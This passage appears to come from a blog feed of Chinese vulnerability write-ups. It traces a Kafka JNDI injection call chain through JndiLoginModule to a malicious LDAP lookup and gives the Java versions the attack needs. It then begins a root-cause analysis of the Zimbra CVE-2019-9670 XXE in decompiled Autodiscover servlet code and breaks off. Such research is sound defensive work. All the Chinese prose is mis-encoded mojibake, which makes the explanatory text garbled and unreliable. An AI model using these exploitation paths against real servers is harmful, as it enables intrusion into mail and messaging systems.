 Method[] methods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (moduleStack[i].<span class="keyword">module</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// instantiate the LoginModule</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Allow any object to be a LoginModule as long as it</span></span><br><span class="line">                    <span class="comment">// conforms to the interface.</span></span><br><span class="line">                    Class&lt;?&gt; c = Class.forName(</span><br><span class="line">                                moduleStack[i].entry.getLoginModuleName(),</span><br><span class="line">                                <span class="literal">true</span>,</span><br><span class="line">                                contextClassLoader);</span><br><span class="line"></span><br><span class="line">                    Constructor&lt;?&gt; constructor = c.getConstructor(PARAMS);</span><br><span class="line">                    Object[] args = &#123; &#125;;</span><br><span class="line">                    moduleStack[i].<span class="keyword">module</span> = constructor.newInstance(args);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// call the LoginModule&#x27;s initialize method</span></span><br><span class="line">                    methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                    <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (methods[mIndex].getName().equals(INIT_METHOD)) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Object[] initArgs = &#123;subject,</span><br><span class="line">                                        callbackHandler,</span><br><span class="line">                                        state,</span><br><span class="line">                                        moduleStack[i].entry.getOptions() &#125;;</span><br><span class="line">                    <span class="comment">// invoke the LoginModule initialize method</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                    <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                    <span class="comment">// the future.</span></span><br><span class="line">                    methods[mIndex].invoke(moduleStack[i].<span class="keyword">module</span>, initArgs);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                <span class="comment">//......</span></span><br></pre></td></tr></table></figure><p>moduleStackå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1686ea21b9a9e6643f7.jpg" title="image-20230403202139848" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1686ea21b9a9e6643f7.jpg" alt="image-20230403202139848"></a></p><p>åœ¨invokeå‡½æ•°ä¸­ï¼Œéå†äº†moduleStackï¼Œè¿›å…¥elseï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1776ea21b9a9e669703.jpg" title="image-20230403202249039" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1776ea21b9a9e669703.jpg" alt="image-20230403202249039"></a></p><p>è¿™é‡ŒINIT_METHODçš„å€¼æ˜¯â€initializeâ€ï¼Œè¿™é‡Œæ˜¯åå°„è·å–moduleStack[i].entry.getLoginModuleName()ä¹Ÿå°±æ˜¯com.sun.security.auth.module.JndiLoginModuleä¸­çš„æ‰€æœ‰æ–¹æ³•å¹¶éå†ï¼Œå¦‚æœæ‰¾åˆ°initializeæ–¹æ³•ï¼Œå°±åˆ©ç”¨åå°„çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚</p><p>æ‰§è¡Œå®Œelseä¸­çš„ä»£ç ä¹‹åï¼Œæ¥ç€æ‰§è¡Œå¦‚ä¸‹çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> ((Boolean)methods[mIndex].invoke</span><br><span class="line">                                (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸Šé¢è°ƒç”¨initializeæ–¹æ³•çš„éƒ¨åˆ†çœ‹æ˜ç™½äº†ï¼Œå°±èƒ½ä¸€çœ¼çœ‹å‡ºè¿™é‡Œæ˜¯è°ƒç”¨com.sun.security.auth.module.JndiLoginModuleçš„loginæ–¹æ³•ã€‚è·Ÿè¿›åï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// attempt the authentication by prompting for the username and pwd</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            attemptAuthentication(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// authentication succeeded</span></span><br><span class="line">           succeeded = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;regular authentication succeeded&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">            cleanState();</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                                <span class="string">&quot;regular authentication failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> le;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†com.sun.security.auth.module.JndiLoginModule#attemptAuthenticationï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf18c6ea21b9a9e66f3bb.jpg" title="image-20230403203005527" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf18c6ea21b9a9e66f3bb.jpg" alt="image-20230403203005527"></a></p><p>å…¶ä¸­userProvideræ˜¯åœ¨initializeæ–¹æ³•ä¸­å¾—åˆ°çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf19c6ea21b9a9e6730cd.jpg" title="image-20230403203238068" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf19c6ea21b9a9e6730cd.jpg" alt="image-20230403203238068"></a></p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬POCä¸­çš„æ¶æ„ldapæœåŠ¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bf1aa6ea21b9a9e6764ff.jpg" title="image-20230403203259274" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bf1aa6ea21b9a9e6764ff.jpg" alt="image-20230403203259274"></a></p><p>ä¹‹åæ‰§è¡Œlookupå®ŒæˆJNDIæ³¨å…¥ã€‚</p><p>æœ€åè´´ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">new KafkaProducer&lt;&gt;(props)</span><br><span class="line">-&gt; KafkaProducer#KafkaProducer(...)</span><br><span class="line">-&gt; KafkaProducer#newSender(logContext, kafkaClient, this.metadata)</span><br><span class="line">-&gt; ClientUtils#createChannelBuilder(this.producerConfig, this.time, logContext)</span><br><span class="line">-&gt; ChannelBuilders#clientChannelBuilder(...;</span><br><span class="line">-&gt; ChannelBuilders#create(...;</span><br><span class="line">-&gt; ((ChannelBuilder)channelBuilder)#configure(configs);</span><br><span class="line">-&gt; LoginManager#acquireLoginManager(...)</span><br><span class="line">-&gt; new LoginManager(jaasContext, saslMechanism, configs, loginMetadata)</span><br><span class="line">-&gt; LoginContext#login()</span><br><span class="line">-&gt; LoginContext#invokePriv(LOGIN_METHOD)</span><br><span class="line">-&gt; LoginContext#invoke(methodName)</span><br><span class="line">-&gt; JndiLoginModule#login()</span><br><span class="line">-&gt; JndiLoginModule#attemptAuthentication(true)</span><br><span class="line">-&gt; InitialContext#lookup(userProvider)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ¡ä»¶è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ï¼ŒåŸºäºè¿œç¨‹LDAPå¼•ç”¨æ³¨å…¥éœ€è¦javaç‰ˆæœ¬å°äº11.0.1ã€8u191ã€7u201ã€6u211ï¼Œå› æ­¤å…¬ç½‘ä¸Šèƒ½å¤Ÿæ‰¾åˆ°çš„ç›®æ ‡å¹¶ä¸å¤šã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zimbra Exploit</title>
      <link href="/2023/03/17/zimbraExploit/"/>
      <url>/2023/03/17/zimbraExploit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CVE-2019-9670-zimbra-XXE"><a href="#CVE-2019-9670-zimbra-XXE" class="headerlink" title="CVE-2019-9670 zimbra XXE"></a>CVE-2019-9670 zimbra XXE</h2><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>ç½‘ä¸Šå…³äºè¿™ä¸ªæ¼æ´çš„å®¡è®¡ä¼¼ä¹æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥åœ¨åˆ†ææ¼æ´åŸç†çš„æ—¶å€™èµ°äº†ä¸€äº›ä¸å¿…è¦çš„å¼¯è·¯ã€‚æ ¹æ®æ¼æ´æŠ«éœ²å‡ºçš„ç»†èŠ‚æ¥çœ‹ï¼Œåœ¨&#x2F;Autodiscoverä¸­å­˜åœ¨CVE-2019-9670ï¼ŒæŸ¥æ‰¾zimbra-coreä¸­å¸¦æœ‰Autodicoverçš„ç±»åï¼š</p><p>find . -name â€œ*.jarâ€|awk â€˜{print â€œjar -tvf â€œ$1}â€™ | sh -x | grep -i Autodiscover</p><p>æ‰¾åˆ°å¦‚ä¸‹ä¸¤ä¸ªjaråŒ…ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bebcf6ea21b9a9e3ef172.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bebec6ea21b9a9e3fc958.jpg"></a></p><p>å¯ä»¥çœ‹å‡ºnashorn.jaræ˜¯jreçš„ä¸­çš„jaråŒ…ï¼Œåº”è¯¥ä¸æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œè€ŒAutoDiscoverServletå¸¦æœ‰Servletå­—æ ·ï¼Œåº”æ˜¯å¯¹å¤–æä¾›æœåŠ¡çš„ã€‚ï¼ˆè¿™é‡Œçº ç»“äº†å¾ˆä¹…ï¼Œå…¶å®å¤§è‡´æµè§ˆä¸€ä¸‹ä»£ç ï¼Œå°±å¯ä»¥ç¡®å®šå“ªä¸ªæ‰æ˜¯ç›®æ ‡ï¼‰</p><p>æ‹¿å‡ºzimbrastore.jaræ”¾å…¥IDEAæˆ–è€…jd-guiè¿›è¡Œåç¼–è¯‘ï¼Œå…¶ä¸­doPostéƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    ZimbraLog.clearContext();</span><br><span class="line">    addRemoteIpToLoggingContext(req);</span><br><span class="line">    log.info(<span class="string">&quot;Handling autodiscover request...&quot;</span>);</span><br><span class="line">    <span class="type">byte</span>[] reqBytes = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span>[] reqBytes = ByteUtil.getContent(req.getInputStream(), req.getContentLength());</span><br><span class="line">    <span class="keyword">if</span> (reqBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;No content found in the request&quot;</span>);</span><br><span class="line">        sendError(resp, <span class="number">600</span>, <span class="string">&quot;No content found in the request&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(reqBytes, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        log.debug(<span class="string">&quot;Request before auth: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">        String responseSchema;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            Enumeration&lt;String&gt; enm = req.getHeaderNames();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(enm.hasMoreElements()) &#123;</span><br><span class="line">                responseSchema = (String)enm.nextElement();</span><br><span class="line">                log.info(<span class="string">&quot;POST header: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;responseSchema + <span class="string">&quot;:&quot;</span> + req.getHeader(responseSchema)&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        responseSchema = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        DocumentBuilder respDoc;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">docBuilderFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            respDoc = docBuilderFactory.newDocumentBuilder();</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> respDoc.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(content)));</span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nList</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;Request&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nList.getLength(); ++i) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nList.item(i);</span><br><span class="line">                <span class="keyword">if</span> (node.getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="type">Element</span> <span class="variable">element</span> <span class="operator">=</span> (Element)node;</span><br><span class="line">                    email = getTagValue(<span class="string">&quot;EMailAddress&quot;</span>, element);</span><br><span class="line">                    responseSchema = getTagValue(<span class="string">&quot;AcceptableResponseSchema&quot;</span>, element);</span><br><span class="line">                    <span class="keyword">if</span> (email != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;cannot parse body: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">            sendError(resp, <span class="number">400</span>, <span class="string">&quot;Body cannot be parsed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (email != <span class="literal">null</span> &amp;&amp; email.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (responseSchema != <span class="literal">null</span> &amp;&amp; responseSchema.length() &gt; <span class="number">0</span> &amp;&amp; !responseSchema.equals(<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006&quot;</span>) &amp;&amp; !responseSchema.equals(<span class="string">&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;</span>)) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Requested response schema not available &quot;</span> + responseSchema);</span><br><span class="line">                sendError(resp, <span class="number">503</span>, <span class="string">&quot;Requested response schema not available &quot;</span> + responseSchema);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Authenticating user&quot;</span>);</span><br><span class="line">                <span class="type">Account</span> <span class="variable">acct</span> <span class="operator">=</span> <span class="built_in">this</span>.authenticate(req, resp, responseSchema);</span><br><span class="line">                <span class="keyword">if</span> (acct != <span class="literal">null</span>) &#123;</span><br><span class="line">                    log.debug(<span class="string">&quot;Authentication finished successfully&quot;</span>);</span><br><span class="line">                    log.debug(<span class="string">&quot;content length: %d, content type: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req.getContentLength(), req.getContentType()&#125;);</span><br><span class="line">                    <span class="keyword">if</span> (req.getContentLength() != <span class="number">0</span> &amp;&amp; req.getContentType() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!AccountUtil.addressMatchesAccount(acct, email)) &#123;</span><br><span class="line">                                log.warn(email + <span class="string">&quot; doesn&#x27;t match account addresses for user &quot;</span> + acct.getName());</span><br><span class="line">                                sendError(resp, <span class="number">500</span>, email + <span class="string">&quot; doesn&#x27;t match account addresses&quot;</span>);</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ServiceException var16) &#123;</span><br><span class="line">                            log.warn(<span class="string">&quot;Account access error; user=&quot;</span> + acct.getName(), var16);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, <span class="string">&quot;Account access error; user=&quot;</span> + acct.getName());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        respDoc = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        String respDoc;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">serviceUrl</span> <span class="operator">=</span> getServiceUrl(acct, responseSchema);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">displayName</span> <span class="operator">=</span> acct.getDisplayName() == <span class="literal">null</span> ? email : acct.getDisplayName();</span><br><span class="line">                            <span class="keyword">if</span> (displayName.contains(<span class="string">&quot;@&quot;</span>)) &#123;</span><br><span class="line">                                displayName = displayName.substring(<span class="number">0</span>, displayName.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            log.debug(<span class="string">&quot;displayName: %s, email: %s, serviceUrl: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;displayName, email, serviceUrl&#125;);</span><br><span class="line">                            <span class="keyword">if</span> (isEwsClient(responseSchema)) &#123;</span><br><span class="line">                                respDoc = createResponseDocForEws(displayName, email, serviceUrl, acct);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                respDoc = createResponseDoc(displayName, email, serviceUrl);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                            log.warn(var15);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, var15.getMessage());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        log.info(<span class="string">&quot;Response: %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;respDoc&#125;);</span><br><span class="line">                        log.debug(<span class="string">&quot;response length: %d&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;respDoc.length()&#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ByteUtil.copy(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(respDoc.getBytes(<span class="string">&quot;UTF-8&quot;</span>)), <span class="literal">true</span>, resp.getOutputStream(), <span class="literal">false</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                            log.error(<span class="string">&quot;copy response error&quot;</span>, var14);</span><br><span class="line">                            sendError(resp, <span class="number">500</span>, var14.getMessage());</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        log.debug(<span class="string">&quot;setting content type to text/xml&quot;</span>);</span><br><span class="line">                        resp.setContentType(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">                        log.info(<span class="string">&quot;sending autodiscover response...&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        log.warn(<span class="string">&quot;No suitable content found in the request&quot;</span>);</span><br><span class="line">                        sendError(resp, <span class="number">600</span>, <span class="string">&quot;No suitable content found in the request&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;No Email address is specified in the Request, %s&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;content&#125;);</span><br><span class="line">            sendError(resp, <span class="number">400</span>, <span class="string">&quot;No Email address is specified in the Request&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„å¦‚ä¸‹éƒ¨åˆ†ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec0e6ea21b9a9e40be67.jpg"></a></p><p>è¿™é‡Œè·å–äº†æˆ‘ä»¬ä¼ å…¥çš„Requestæ ‡ç­¾ä¸­çš„å…ƒç´ ï¼Œå°†EMailAddressæ ‡ç­¾çš„å€¼å’ŒAcceptableResponseSchemaæ ‡ç­¾çš„å€¼åˆ†åˆ«èµ‹å€¼ç»™emailå’ŒresponseSchemaï¼Œè‹¥emailä¸ºç©ºæˆ–responseSchemaä¸ºç©ºï¼Œåˆ™ç›´æ¥è¿”å›400çŠ¶æ€ç åŠBody cannot be parsedã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä¼ å…¥å¦‚ä¸‹bodyï¼ŒæŸ¥çœ‹å“åº”ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg" title="image-20230403125629868" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec2e6ea21b9a9e41b748.jpg" alt="image-20230403125629868"></a></p><p>æ­¤æ—¶å°±å¯ä»¥ç¡®è®¤è¿™ä¸ªç±»æ˜¯AutodiscoveråŠŸèƒ½å¯¹åº”ç±»ã€‚è¿›å…¥ä¹‹åçš„ifåˆ¤æ–­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/642bec3c6ea21b9a9e421f9b.jpg" title="image-20230403125818642" class="gallery-item"><img 